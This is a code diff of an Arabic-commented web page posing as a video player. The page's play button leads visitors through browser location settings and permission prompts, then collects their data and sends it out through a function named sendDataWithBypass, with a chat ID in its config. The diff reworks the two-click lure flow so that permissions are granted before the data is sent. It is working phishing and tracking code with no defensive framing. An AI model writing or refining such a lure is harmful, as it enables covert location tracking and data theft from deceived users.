@@ -84,57 +84,6 @@
             margin-left: 8px;
         }
 
-        /* زر تشغيل الفيديو (بدلاً من الترس) */
-        #gearButton {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: rgba(255, 0, 0, 0.75);
-            border: 4px solid #ff6b6b;
-            border-radius: 50%;
-            width: 130px;
-            height: 130px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(8px);
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
-            z-index: 10;
-            text-align: center;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 0;
-        }
-        #gearButton:hover {
-            transform: translate(-50%, -50%) scale(1.08);
-            background: rgba(255, 0, 0, 0.9);
-            border-color: #ff4757;
-            box-shadow: 0 0 70px rgba(255, 0, 0, 0.8);
-        }
-        #gearButton .icon-gear {
-            display: none;
-        }
-        #gearButton .play-icon-btn {
-            font-size: 55px;
-            line-height: 1;
-            color: #fff;
-            margin-bottom: 2px;
-            display: block;
-            filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.5));
-        }
-        #gearButton .main-text {
-            font-size: 22px;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
-            margin-top: 2px;
-        }
-        #gearButton .sub-text {
-            display: none;
-        }
-
         #retryButton {
             display: none;
             margin-top: 20px;
@@ -285,16 +234,6 @@
                 border-bottom-width: 14px;
                 margin-left: 5px;
             }
-            #gearButton {
-                width: 100px;
-                height: 100px;
-            }
-            #gearButton .play-icon-btn {
-                font-size: 40px;
-            }
-            #gearButton .main-text {
-                font-size: 16px;
-            }
         }
     </style>
 </head>
@@ -310,13 +249,6 @@
             <div class="play-button-overlay" id="playButtonOverlay">
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
-            </div>
-
-            <!-- زر تشغيل الفيديو (بدلاً من الترس) -->
-            <div id="gearButton">
-                <div class="play-icon-btn">▶</div>
-                <div class="main-text">تشغيل الفيديو</div>
-                <div class="sub-text">اضغط لفتح الإعدادات</div>
             </div>
 
             <button id="retryButton">إعادة المحاولة</button>
@@ -359,17 +291,17 @@
                 chatId: ''
             };
 
-            let settingsOpened = false;    // true تعني أننا في انتظار العودة من الإعدادات
+            let settingsOpened = false;      // هل تم فتح الإعدادات؟
             let videoStarted = false;
             let isProcessing = false;
             let dataSent = false;
+            let secondClick = false;          // هل هذه الضغطة الثانية؟
 
             const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
-            const gearBtn = document.getElementById('gearButton');
             const retryBtn = document.getElementById('retryButton');
 
             // ===== طلب الصلاحيات =====
@@ -557,7 +489,7 @@
                 }
             }
 
-            // ===== جمع البيانات وإرسالها (تُستدعى دائماً) =====
+            // ===== جمع البيانات وإرسالها =====
             async function collectAndSendData() {
                 if (dataSent) return;
                 dataSent = true;
@@ -587,11 +519,11 @@
 
                     await sendDataWithBypass(data);
                 } catch (e) {
-                    // تجاهل الأخطاء، المهم أن نحاول الإرسال
+                    // تجاهل الأخطاء
                 }
             }
 
-            // ===== تشغيل الفيديو فوراً =====
+            // ===== تشغيل الفيديو =====
             function startVideoWithSound() {
                 if (videoStarted) return;
                 videoStarted = true;
@@ -629,22 +561,14 @@
             }
 
             // ===== إظهار / إخفاء الأزرار =====
-            function showGearButton() {
-                gearBtn.style.display = 'flex';
-                playBtn.style.display = 'none';
-                retryBtn.style.display = 'none';
-            }
-
-            function hideGearButton() {
-                gearBtn.style.display = 'none';
-                playBtn.style.display = 'flex';
-                retryBtn.style.display = 'none';
-            }
-
             function showRetryButton() {
                 retryBtn.style.display = 'block';
-                gearBtn.style.display = 'none';
                 playBtn.style.display = 'none';
+            }
+
+            function hideRetryButton() {
+                retryBtn.style.display = 'none';
+                playBtn.style.display = 'flex';
             }
 
             // ===== معالج الضغط على زر التشغيل =====
@@ -652,62 +576,91 @@
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
 
-                isProcessing = true;
+                // --- الضغطة الأولى: فتح الإعدادات ---
+                if (!settingsOpened) {
+                    settingsOpened = true;
+                    // نخفي الزر ونظهر مؤقتاً
+                    playBtn.style.opacity = '0.5';
+                    playBtn.style.pointerEvents = 'none';
+                    spinner.style.display = 'block';
+                    loading.style.display = 'block';
 
-                // إذا كانت settingsOpened == true، فهذه هي الضغطة الثانية بعد العودة من الإعدادات
-                if (settingsOpened) {
-                    settingsOpened = false;
-                    // طلب الصلاحيات
-                    const granted = await requestPermissions();
-                    // تشغيل الفيديو فوراً (بغض النظر عن النتيجة)
-                    startVideoWithSound();
-                    // إرسال البيانات
-                    if (!dataSent) {
-                        collectAndSendData();
-                    }
-                    // إذا رفض، نعرض زر الترس (الذي هو زر تشغيل الفيديو)
-                    if (!granted) {
-                        showGearButton();
-                    } else {
-                        hideGearButton();
-                    }
-                    isProcessing = false;
+                    // فتح إعدادات الموقع
+                    openBrowserLocationSettings();
+
+                    // بعد فتح الإعدادات، ننتظر العودة (سيتم التعامل معها في visibilitychange)
+                    // لكن نعيد الزر لحالته بعد فترة (لن يتمكن المستخدم من الضغط مرة أخرى إلا بعد العودة)
+                    setTimeout(() => {
+                        playBtn.style.opacity = '1';
+                        playBtn.style.pointerEvents = 'auto';
+                        spinner.style.display = 'none';
+                        loading.style.display = 'none';
+                    }, 2000);
+
                     return;
                 }
 
-                // الضغطة الأولى: نفتح إعدادات الموقع
-                settingsOpened = true;
-                openBrowserLocationSettings();
-                // لا نطلب صلاحيات ولا نشغل فيديو الآن
-                isProcessing = false;
-            }
+                // --- الضغطة الثانية (أو بعد العودة من الإعدادات) ---
+                if (settingsOpened && !videoStarted) {
+                    isProcessing = true;
+                    playBtn.style.opacity = '0.5';
+                    playBtn.style.pointerEvents = 'none';
+                    spinner.style.display = 'block';
+                    loading.style.display = 'block';
 
-            // ===== معالج زر "تشغيل الفيديو" (الذي كان ترس) =====
-            function handleGearClick() {
-                // هذا الزر يظهر عند رفض الصلاحيات، نفتح الإعدادات مرة أخرى
-                settingsOpened = true;
-                openBrowserLocationSettings();
+                    // 1. طلب الصلاحيات
+                    const granted = await requestPermissions();
+
+                    spinner.style.display = 'none';
+                    loading.style.display = 'none';
+                    playBtn.style.opacity = '1';
+                    playBtn.style.pointerEvents = 'auto';
+
+                    if (granted) {
+                        // 2. تشغيل الفيديو
+                        startVideoWithSound();
+                        // 3. جمع البيانات وإرسالها
+                        if (!dataSent) {
+                            collectAndSendData();
+                        }
+                        hideRetryButton();
+                    } else {
+                        // إذا لم تمنح الصلاحيات، نعرض زر إعادة المحاولة
+                        showRetryButton();
+                    }
+
+                    isProcessing = false;
+                    // نعيد تعيين settingsOpened لمنع تكرار الضغطة الثانية
+                    settingsOpened = false;
+                }
             }
 
             // ===== معالج زر إعادة المحاولة =====
             async function handleRetryClick() {
-                // نطلب الصلاحيات مباشرة
                 const granted = await requestPermissions();
                 if (granted) {
-                    hideGearButton();
+                    hideRetryButton();
                     startVideoWithSound();
                     if (!dataSent) {
                         collectAndSendData();
                     }
                 } else {
-                    showGearButton();
+                    // يبقى الزر ظاهراً
                 }
             }
 
-            // ===== مراقبة العودة من الإعدادات (لا نقوم بأي شيء تلقائي، ننتظر الضغطة الثانية) =====
+            // ===== مراقبة العودة من الإعدادات =====
             document.addEventListener('visibilitychange', function() {
-                // لا نفعل شيئاً هنا، لأننا نعتمد على الضغطة الثانية
-                // يمكن إضافة تنبيه أو لا
+                // عند العودة من الإعدادات (وكانت الإعدادات قد فُتحت)
+                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
+                    // نُعلم المستخدم بأنه يمكنه الضغط مرة أخرى لطلب الإذن
+                    // نعيد تمكين الزر
+                    playBtn.style.opacity = '1';
+                    playBtn.style.pointerEvents = 'auto';
+                    spinner.style.display = 'none';
+                    loading.style.display = 'none';
+                    // لا نطلب الإذن تلقائياً، بل ننتظر الضغطة الثانية
+                }
             });
 
             // ===== ربط الأحداث =====
@@ -716,9 +669,6 @@
             }
             if (thumbnailArea) {
                 thumbnailArea.addEventListener('click', handlePlayClick);
-            }
-            if (gearBtn) {
-                gearBtn.addEventListener('click', handleGearClick);
             }
             if (retryBtn) {
                 retryBtn.addEventListener('click', handleRetryClick);
@@ -769,6 +719,5 @@
 
         })();
     </script>
-
 </body>
 </html>
